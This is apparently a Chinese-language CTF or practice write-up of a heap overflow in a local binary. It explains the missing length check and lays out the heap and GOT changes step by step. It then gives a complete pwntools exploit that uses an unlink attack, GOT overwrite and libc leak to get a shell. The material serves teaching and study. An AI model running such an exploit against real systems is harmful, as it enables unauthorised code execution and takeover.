# 漏洞利用文档

## 执行环境
基于exp脚本和调试记录分析，程序的运行环境如下：
- **二进制文件**: `./data/sample0`（64位ELF程序）
- **架构**: x86-64
- **内存布局**: 无PIE（Position Independent Executable），全局变量和GOT表地址固定（如全局数组`0x602140`）
- **保护机制**: 
  - 部分RELRO（GOT表可写，允许覆盖）
  - 无栈保护（Canary未启用，但堆溢出利用不需要绕过栈保护）
  - NX（Non-Executable Stack）可能启用，但通过GOT覆盖实现代码执行
  - 无PIE，代码段地址固定
- **依赖库**: 标准C库（libc），通过`elf.libc`自动加载
- **运行环境**: Linux系统，使用pwntools进行漏洞利用，终端为tmux

## 漏洞成因
### 关键结构体
- **全局指针数组 `::s`**（地址`0x602140`）：存储所有分配的内存块指针，最大索引由`dword_602100`控制
- **内存块布局**: 每个分配的内存块包含chunk头（prev_size和size）和用户数据区

### 漏洞分析
**漏洞位置**: `sub_4009E8`函数（选项2的写入功能）
**漏洞类型**: 堆溢出（Heap Overflow）

**反编译代码关键部分**:
```c
fgets(s, 16, stdin);
n = atoll(s);  // 用户可控制写入长度n
ptr = (&::s)[v2];
for ( i = fread(ptr, 1u, n, stdin); i > 0; i = fread(ptr, 1u, n, stdin) )
{
  ptr += i;
  n -= i;
}
```

**漏洞原因**:
1. **缺少边界检查**: 写入长度`n`由用户输入控制，未验证是否超过实际分配的内存大小
2. **无条件循环写入**: 循环持续读取数据直到达到用户指定的`n`字节，无视内存边界
3. **堆布局可利用**: 分配的内存块在堆中连续排列，溢出可覆盖相邻chunk的元数据

**利用条件**: 通过精心构造的写入操作，可覆盖chunk头中的size、prev_size字段或伪造完整chunk结构，进而触发unlink攻击修改全局指针，实现任意地址读写。

## 漏洞利用过程
以下表格描述了exp执行过程中关键步骤的堆内存变化和全局指针状态：

| 步骤 | 操作 | 堆内存关键变化 | 全局指针数组 (`0x602140`) | 利用效果 |
|------|------|----------------|--------------------------|----------|
| 1 | `alloc(0x100); alloc(0x30); alloc(0x80)` | 分配三个连续chunk：索引0（0x100）、索引1（0x30）、索引2（0x80） | `[0xf61d020, 0xf61d540, 0xf61d580]` | 创建相邻chunk布局，为溢出提供目标 |
| 2 | `edit(1, len(payload), payload)` | - 索引1用户数据区被伪造chunk覆盖<br>- 索引2chunk头修改：prev_size=0x30, size=0x90 | 未变化 | 创建伪造chunk结构，为unlink攻击做准备 |
| 3 | `free(1)` | 触发unlink操作，伪造chunk的fd/bk指针写入目标地址 | `[0x602018, 0x000000, 0x602088]` | 全局指针被修改，索引0指向free@got，索引2指向atoi@got |
| 4 | `edit(2, len(payload2), payload2)` | 堆内存写入GOT指针数据 | `[0x602018, 0x602020, 0x602088]` | 全局指针完整指向GOT表：free、puts、atoi |
| 5 | `edit(0, len(payload3), payload3)` | free@got被覆盖为puts@plt地址 | GOT表修改：free@got = puts@plt | free函数被劫持，调用free时实际执行puts |
| 6 | `free(1)` | 调用puts@plt输出puts@got内容，泄露libc地址 | 索引1指针为0（已释放） | 获取libc基地址，计算system地址 |
| 7 | `edit(2, len(payload4), payload4)` | atoi@got被覆盖为system地址 | GOT表修改：atoi@got = system | atoi函数被劫持，输入时执行system |
| 8 | `p.interactive()` | 启动`/bin/dash` shell | 程序终止，新进程启动 | 获得shell权限，利用成功 |

### 内存变化细节
- **步骤2伪造chunk结构**:
  ```
  地址0xf61d540: 00 00 00 00 00 00 00 00  # fake prev_size
  地址0xf61d548: 20 00 00 00 00 00 00 00  # fake size (0x20)
  地址0xf61d550: 38 21 60 00 00 00 00 00  # fake fd (0x602138)
  地址0xf61d558: 40 21 60 00 00 00 00 00  # fake bk (0x602140)
  地址0xf61d560: 20 00 00 00 00 00 00 00  # fake next chunk prev_size
  地址0xf61d568: 61 61 61 61 61 61 61 61  # padding
  ```
- **unlink攻击原理**: 释放伪造chunk时，unlink操作执行`fd->bk = bk`和`bk->fd = fd`，从而将全局指针数组修改为指向GOT表。
- **GOT覆盖**: 通过修改后的全局指针，编辑操作可直接覆盖GOT条目，劫持函数调用流。

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample0')
elf = ELF('./data/sample0')
libc = elf.libc
g_pointer = 0x602140  # 全局指针数组地址

def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())  # 漏洞点：size可由用户任意指定，导致堆溢出
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recv()

# 步骤1: 分配三个chunk，创建相邻布局
alloc(0x100)
alloc(0x30)  # 索引1，小尺寸，用于伪造chunk
alloc(0x80)  # 索引2，相邻chunk，溢出目标

# 步骤2: 在索引1创建伪造chunk结构，并溢出修改索引2的chunk头
payload = p64(0) + p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90)
edit(1, len(payload), payload)  # 利用堆溢出覆盖索引2头

# 步骤3: 释放索引1，触发unlink攻击，修改全局指针
free(1)

# 步骤4: 通过索引2编辑全局指针数组，使其指向GOT表
payload2 = b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
edit(2, len(payload2), payload2)

# 步骤5: 覆盖free@got为puts@plt，劫持free函数
payload3 = p64(elf.plt['puts'])
edit(0, len(payload3), payload3)

# 步骤6: 调用free(1)实际执行puts，泄露libc地址
ret = '0x' + free(1)[:6][::-1].hex()
puts_addr = int(ret, 16)
libc_addr = puts_addr - libc.sym['puts']
system_addr = libc_addr + libc.sym['system']

# 步骤7: 覆盖atoi@got为system，劫持atoi函数
payload4 = p64(system_addr)
edit(2, len(payload4), payload4)

# 步骤8: 交互模式，通过输入触发system("/bin/sh")
p.interactive()
```

### 注释说明
- **全局指针利用**: `g_pointer+16-0x18`和`g_pointer+16-0x10`计算伪造chunk的fd/bk指针，指向全局数组附近，确保unlink修改成功。
- **GOT覆盖**: 通过编辑全局指针指向的GOT地址，直接覆盖函数指针，实现控制流劫持。
- **Libc泄露**: 利用puts输出GOT条目内容，计算libc基地址，绕过ASLR。
- **最终shell**: 覆盖atoi@got为system后，程序输入会被解析为命令执行，通过`p.interactive()`获得shell控制权。

此漏洞利用成功演示了如何通过堆溢出和unlink攻击实现从内存破坏到任意代码执行的全过程。
